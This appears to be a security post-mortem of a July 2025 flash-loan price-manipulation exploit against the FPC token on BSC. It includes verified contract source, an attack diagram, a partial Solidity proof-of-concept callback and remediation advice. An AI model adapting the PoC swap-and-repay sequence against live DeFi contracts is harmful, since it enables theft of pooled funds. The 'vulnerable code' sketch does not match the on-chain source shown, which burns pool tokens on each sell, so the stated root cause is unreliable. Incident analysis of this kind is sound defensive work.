# FPC Token — Flash Loan Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-01 |
| **Protocol** | FPC Token |
| **Chain** | BSC |
| **Loss** | ~4,700,000 USDT |
| **Attacker** | [0x18dd258631b23777c101440380bf053c79db3d9d](https://bscscan.com/address/0x18dd258631b23777c101440380bf053c79db3d9d) |
| **Attack Tx** | [0x3a9dd216](https://bscscan.com/tx/0x3a9dd216fb6314c013fa8c4f85bfbbe0ed0a73209f54c57c1aab02ba989f5937) |
| **Vulnerable Contract** | [0xb192d4a737430aa61cea4ce9bfb6432f7d42592f](https://bscscan.com/address/0xb192d4a737430aa61cea4ce9bfb6432f7d42592f) |
| **Root Cause** | FPC token's internal `getPrice()` function relies on manipulable instantaneous PancakeSwap pool reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/FPC_exp.sol) |

---

## 1. Vulnerability Overview

The FPC token contract determines token price using the current reserve ratio of a PancakeSwap pool in its internal logic. The attacker borrowed 23,020,000 USDT via a PancakeSwap V3 flash loan, bought a large amount of FPC to manipulate the price, then called a price-dependent function within the FPC contract to realize the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: token internal logic calculates price using PancakeSwap pool ratio
contract FPC {
    IPancakePair public pair; // USDT/FPC pool

    function getPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        // Instantaneous reserves — manipulable via flash loan
        return (uint256(reserve0) * 1e18) / uint256(reserve1);
    }

    function rewardOrProcess() external {
        uint256 price = getPrice(); // Uses manipulated price
        uint256 reward = calculateReward(price);
        token.transfer(msg.sender, reward); // Excess reward paid out
    }
}

// ✅ Fix: Use TWAP or an external oracle
function getPrice() public view returns (uint256) {
    return twapOracle.consult(address(pair), 1e18); // 30-minute TWAP
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: future/token.sol
function setRewardPoolAddress(address _rewardPoolAddress) external onlyOwner {
        require(_rewardPoolAddress != address(0), "Invalid address");
        rewardPoolAddress = _rewardPoolAddress;
    }

// ... (lines 94-99 omitted) ...

    function setLpBurnEnabled(bool _lpBurnEnabled) external onlyOwner {
        lpBurnEnabled = _lpBurnEnabled;
    }
    function setMaxBuyRate(uint _maxBuyRate) external onlyOwner {
        require(_maxBuyRate > 0 && _maxBuyRate <= 1000, "Invalid rate");
        maxBuyRate = _maxBuyRate;
    }
    function open() external onlyOwner {
        require(startBlock == 0, "Already opened");
        startBlock = block.number;
    }
    function close() external onlyOwner {
        require(startBlock > 0, "Not opened yet");
        startBlock = 0;
    }
    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        require(value > 0, "Invalid value");

        if (whitelisted[from] || whitelisted[to]) {
            super._update(from, to, value);
            emit TransferWithFee(from, to, value, 0);
            return;
        }

        (bool isAdd,bool isDel) =  _isLiquidity(from, to);

        // swap
        if (isPool[from] || isPool[to]) {
            require(startBlock > 0, "Not opened yet");
            // buy || remove 
            if(isPool[from] || isDel) {
                require(buyState, "Buy not allowed");
                require(lastTradeBlock[to]  + 3 < block.number, "Trade too frequently");
                super._update(from, to, value);
                if (isDel){
                    emit LiquidityRemoved(to, value);
                }else {
                    require(value <= _maxBuyAmount(), "Exceeds max buy amount");
                    emit Buy(from, to, value);
                } 
                lastTradeBlock[to] = block.number;
                return;
            } 
            
            // sell || add poll usdt in front of
            if(isPool[to] || isAdd)  { 
                require(sellState, "Sell not allowed");
                require(lastTradeBlock[from]  + 3 < block.number, "Trade too frequently");
                if(!isAdd){
                    uint marketFee = (value * 3) / 100;
                    uint burnAmount =0;
                    if(!_isLpStopBurn()){
                        burnAmount = (value * 2) / 100;
                        super._update(from, DEAD, burnAmount);
                    }
                    super._update(from, marketAddress, marketFee);
                    uint totalFee = marketFee + burnAmount;
                    uint burnPoolAmount = (value * 65) / 100;
                    burnLpToken(burnPoolAmount);
                    value -= totalFee;
                    emit Sell(from, to, value, totalFee, burnAmount);
                }
                lastTradeBlock[from] = block.number;
            }
        }
        super._update(from, to, value);
    }
    function _isLiquidity(address from,address to) internal view returns(bool isAdd,bool isDel){
        IUniswapV2Pair pair = IUniswapV2Pair(usdtPool);
        address token0 = pair.token0();
        address token1 = pair.token1();

        (uint reserve0, uint reserve1, ) = pair.getReserves();
        uint balance0 = IERC20(token0).balanceOf(address(pair));
        uint balance1 = IERC20(token1).balanceOf(address(pair));
        if (isPool[to]) {
            if (token0 == address(this) && balance1 > reserve1) {
                isAdd = true;
            } else if (token1 == address(this) && balance0 > reserve0) {
                isAdd = true;
            }
        }

        
        if (isPool[from]) {
            if (token0 == address(this) && balance1 < reserve1) {
                isDel = true;
            } else if (token1 == address(this) && balance0 < reserve0) {
                isDel = true;
            }
        }
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap V3 Pool: flash(23,020,000 USDT)
  │         [pancakeV3FlashCallback callback]
  │
  ├─2─▶ PancakeRouter: USDT → FPC large buy
  │         └─ FPC price spikes (pool ratio distorted)
  │
  ├─3─▶ FPC Contract: calls price-dependent function with manipulated price
  │         └─ Receives excess rewards/payouts
  │
  ├─4─▶ PancakeRouter: FPC → USDT sell
  │         └─ Profit realized
  │
  └─5─▶ PancakeSwap V3 Pool: flash loan repaid + ~4.7M USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
    // Buy large amount of FPC with 23,019,990 USDT (price manipulation)
    uint256 amountIn = 23_019_990 ether;
    address[] memory path = new address[](2);
    path[0] = USDT_ADDR;
    path[1] = FPC_ADDR;

    IERC20(USDT_ADDR).approve(PANCAKE_ROUTER, amountIn);
    // Distort pool ratio via USDT → FPC swap
    IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amountIn, 0, path, address(this), block.timestamp
    );

    // Call FPC contract function based on manipulated price (receive excess profit)
    // ...

    // Sell FPC back to USDT
    uint256 fpcBal = IERC20(FPC_ADDR).balanceOf(address(this));
    IERC20(FPC_ADDR).approve(PANCAKE_ROUTER, fpcBal);
    path[0] = FPC_ADDR; path[1] = USDT_ADDR;
    IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        fpcBal, 0, path, address(this), block.timestamp
    );

    // Repay flash loan
    IERC20(USDT_ADDR).transfer(PANCAKE_POOL, 23_020_000 ether + fee0);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Vector** | Flash loan + DEX pool price manipulation |
| **Impact Scope** | Total protocol liquidity (~4.7M USDT) |
| **CWE** | CWE-1077 (Reliance on Untrusted External Input) |
| **DASP** | Price Manipulation |

## 6. Remediation Recommendations

1. **Adopt TWAP Oracle**: Use a time-weighted average price over a minimum 30-minute window
2. **Chainlink Price Feed**: Integrate an externally validated oracle
3. **Remove Pool Price Dependency**: Prohibit direct reference to DEX pool reserves in contract internal logic
4. **Price Deviation Circuit Breaker**: Block trades when excessive price movement occurs within a single block

## 7. Lessons Learned

- Using a DEX pool's instantaneous price as the basis for on-chain logic is the most archetypal flash loan attack vector.
- A loss of 4.7M USDT occurred in a single transaction — a stark demonstration of the importance of oracle design.
- When a token contract uses its own price feed in internal logic, it must be reviewed as a separate audit item.